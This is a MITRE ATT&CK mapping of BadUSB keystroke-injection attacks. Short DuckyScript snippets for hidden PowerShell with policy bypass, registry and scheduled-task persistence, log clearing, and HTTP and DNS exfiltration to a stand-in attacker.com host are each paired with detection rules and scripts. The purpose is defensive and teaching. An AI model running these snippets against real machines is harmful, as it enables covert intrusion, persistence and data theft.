# MITRE ATT&CK Mapping for BadUSB Attacks

## Overview

This document maps BadUSB/DuckyScript techniques to the MITRE ATT&CK framework for both offensive (Red Team) understanding and defensive (Blue Team) detection.

---

## Attack Lifecycle Mapping

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BADUSB ATTACK LIFECYCLE                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  INITIAL ACCESS ──► EXECUTION ──► PERSISTENCE ──► COLLECTION        │
│       │                │              │              │               │
│       ▼                ▼              ▼              ▼               │
│    T1091           T1059.001      T1547.001      T1005             │
│    T1200           T1059.003      T1053.005      T1119             │
│                    T1204.002      T1546.003      T1560             │
│                                                      │               │
│                                                      ▼               │
│                    DEFENSE EVASION ◄──────── EXFILTRATION           │
│                         │                        │                  │
│                         ▼                        ▼                  │
│                      T1027                    T1041                 │
│                      T1070                    T1048                 │
│                      T1036                    T1567                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Initial Access Techniques

### T1091 - Replication Through Removable Media

| Attribute | Value |
|-----------|-------|
| Tactic | Initial Access |
| Platforms | Windows, macOS, Linux |
| Permissions | User |
| Detection | USB device logs, process monitoring |

**BadUSB Implementation:**
```
REM T1091: USB device insertion triggers payload
DELAY 2000
GUI r
STRING cmd
ENTER
```

**Detection (Sigma):**
```yaml
title: USB Device Insertion with Rapid Keystroke
logsource:
    product: windows
    service: security
detection:
    usb_insert:
        EventID: 6416
    rapid_input:
        EventID: 4688
        CommandLine|contains: 'powershell'
    timeframe: 30s
    condition: usb_insert and rapid_input
level: high
```

---

### T1200 - Hardware Additions

| Attribute | Value |
|-----------|-------|
| Tactic | Initial Access |
| Platforms | Windows, macOS, Linux |
| Permissions | Physical Access |
| Detection | Asset inventory, USB device policies |

**BadUSB Implementation:**
```
REM T1200: Physical device masquerading as keyboard
ID 046D:C52B Logitech:Unifying Receiver
DELAY 2000
```

**Detection Script:**
```bash
#!/bin/bash
# Detect new HID devices
echo "[*] Monitoring for new HID devices..."
KNOWN_DEVICES="/tmp/known_usb_devices"

# Save baseline
lsusb > "$KNOWN_DEVICES"

while true; do
    CURRENT=$(lsusb)
    DIFF=$(diff <(cat "$KNOWN_DEVICES") <(echo "$CURRENT"))
    if [ -n "$DIFF" ]; then
        echo "[ALERT] USB device change detected:"
        echo "$DIFF"
    fi
    sleep 5
done
```

---

## Execution Techniques

### T1059.001 - PowerShell

| Attribute | Value |
|-----------|-------|
| Tactic | Execution |
| Platforms | Windows |
| Permissions | User |
| Detection | Script Block Logging, Module Logging |

**BadUSB Implementations:**

```
REM Standard PowerShell execution
GUI r
DELAY 500
STRING powershell
ENTER

REM Hidden execution (evasion)
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -nop
ENTER

REM Encoded command
GUI r
DELAY 500
STRING powershell -enc BASE64STRING
ENTER
```

**Detection (Splunk):**
```spl
index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
| search EventCode=4104
| where match(ScriptBlockText, "(?i)(-w\s*hidden|-ep\s*bypass|-enc)")
| table _time ComputerName ScriptBlockText
```

---

### T1059.003 - Windows Command Shell

| Attribute | Value |
|-----------|-------|
| Tactic | Execution |
| Platforms | Windows |
| Permissions | User |
| Detection | Process monitoring, command line logging |

**BadUSB Implementation:**
```
REM Standard cmd execution
GUI r
DELAY 500
STRING cmd /c whoami > %TEMP%\out.txt
ENTER
```

**Detection (Sigma):**
```yaml
title: Suspicious CMD Execution via BadUSB
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith: '\cmd.exe'
        ParentImage|endswith: '\explorer.exe'
        CommandLine|contains:
            - '/c '
            - '%TEMP%'
            - 'powershell'
    condition: selection
level: medium
```

---

## Persistence Techniques

### T1547.001 - Registry Run Keys

| Attribute | Value |
|-----------|-------|
| Tactic | Persistence |
| Platforms | Windows |
| Permissions | User (HKCU), Admin (HKLM) |
| Detection | Registry monitoring |

**BadUSB Implementation:**
```
REM Add persistence via registry
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\payload.exe"
```

**Detection (Sysmon):**
```xml
<RuleGroup groupRelation="or">
    <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
    </RegistryEvent>
</RuleGroup>
```

---

### T1053.005 - Scheduled Task

| Attribute | Value |
|-----------|-------|
| Tactic | Persistence |
| Platforms | Windows |
| Permissions | User/Admin |
| Detection | Task creation events (4698) |

**BadUSB Implementation:**
```
STRINGLN schtasks /create /tn "SystemUpdate" /tr "powershell -w hidden -f C:\temp\beacon.ps1" /sc onlogon /ru SYSTEM
```

**Detection (Elastic):**
```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "event.code": "4698" } },
        { "wildcard": { "winlog.event_data.TaskContent": "*hidden*" } }
      ]
    }
  }
}
```

---

## Collection Techniques

### T1005 - Data from Local System

| Attribute | Value |
|-----------|-------|
| Tactic | Collection |
| Platforms | All |
| Permissions | User |
| Detection | File access monitoring |

**BadUSB Implementation:**
```
REM Collect system information
STRINGLN $info = @{
STRINGLN   Host = $env:COMPUTERNAME
STRINGLN   User = $env:USERNAME
STRINGLN   IP = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
STRINGLN }
STRINGLN $info | ConvertTo-Json | Out-File "$env:TEMP\.sysinfo.json"
```

---

### T1056.001 - Keylogging

| Attribute | Value |
|-----------|-------|
| Tactic | Collection, Credential Access |
| Platforms | Windows, macOS, Linux |
| Permissions | User/Admin |
| Detection | Process monitoring, API hooking detection |

**Note:** Full keylogger implementations are outside scope for ethical reasons. Detection focus only.

**Detection (Process Monitor):**
- Monitor for `SetWindowsHookEx` API calls
- Watch for suspicious `GetAsyncKeyState` usage
- Alert on processes writing to key log files

---

## Defense Evasion Techniques

### T1027 - Obfuscated Files or Information

| Attribute | Value |
|-----------|-------|
| Tactic | Defense Evasion |
| Platforms | All |
| Permissions | User |
| Detection | Script block logging, entropy analysis |

**BadUSB Implementation:**
```
REM Base64 encoded payload
STRINGLN $enc = "V3JpdGUtSG9zdCAiSGVsbG8i"
STRINGLN [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc)) | iex
```

**Detection:**
```bash
#!/bin/bash
# Detect base64 encoded PowerShell commands
grep -rE "FromBase64String|ToBase64String|-enc\s+[A-Za-z0-9+/=]{20,}" /var/log/ 2>/dev/null
```

---

### T1070 - Indicator Removal

| Attribute | Value |
|-----------|-------|
| Tactic | Defense Evasion |
| Platforms | All |
| Permissions | User/Admin |
| Detection | Log deletion monitoring |

**BadUSB Implementation:**
```
REM Clear PowerShell history
STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -EA SilentlyContinue

REM Clear event logs (requires admin)
STRINGLN wevtutil cl Security
STRINGLN wevtutil cl System
```

**Detection:**
- Alert on Event ID 1102 (Log cleared)
- Monitor PowerShell history file deletion
- Enable protected event logging

---

## Exfiltration Techniques

### T1041 - Exfiltration Over C2 Channel

| Attribute | Value |
|-----------|-------|
| Tactic | Exfiltration |
| Platforms | All |
| Permissions | User |
| Detection | Network monitoring, proxy logs |

**BadUSB Implementation:**
```
REM HTTP POST exfiltration
STRINGLN Invoke-WebRequest -Uri "https://attacker.com/collect" -Method POST -Body $data
```

---

### T1048.003 - Exfiltration Over Alternative Protocol (DNS)

| Attribute | Value |
|-----------|-------|
| Tactic | Exfiltration |
| Platforms | All |
| Permissions | User |
| Detection | DNS query analysis |

**BadUSB Implementation:**
```
REM DNS exfiltration
STRINGLN $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($info))
STRINGLN Resolve-DnsName "$data.exfil.attacker.com"
```

**Detection (DNS Monitoring):**
```bash
#!/bin/bash
# Detect DNS exfiltration patterns
# Long subdomain queries (>50 chars) are suspicious
tcpdump -i eth0 port 53 2>/dev/null | while read line; do
    QUERY=$(echo "$line" | grep -oP 'A\? \K[^ ]+')
    if [ ${#QUERY} -gt 50 ]; then
        echo "[ALERT] Possible DNS exfil: $QUERY"
    fi
done
```

---

## Quick Reference Matrix

| Technique ID | Name | Tactic | BadUSB Relevance |
|--------------|------|--------|------------------|
| T1091 | Removable Media | Initial Access | Primary vector |
| T1200 | Hardware Additions | Initial Access | Primary vector |
| T1059.001 | PowerShell | Execution | Very Common |
| T1059.003 | Command Shell | Execution | Common |
| T1547.001 | Registry Run Keys | Persistence | Common |
| T1053.005 | Scheduled Task | Persistence | Common |
| T1005 | Local Data | Collection | Very Common |
| T1027 | Obfuscation | Defense Evasion | Common |
| T1070 | Indicator Removal | Defense Evasion | Common |
| T1041 | C2 Exfil | Exfiltration | Common |
| T1048 | Alt Protocol Exfil | Exfiltration | Advanced |

---

[← Back to Technical Addendum](../README.md)
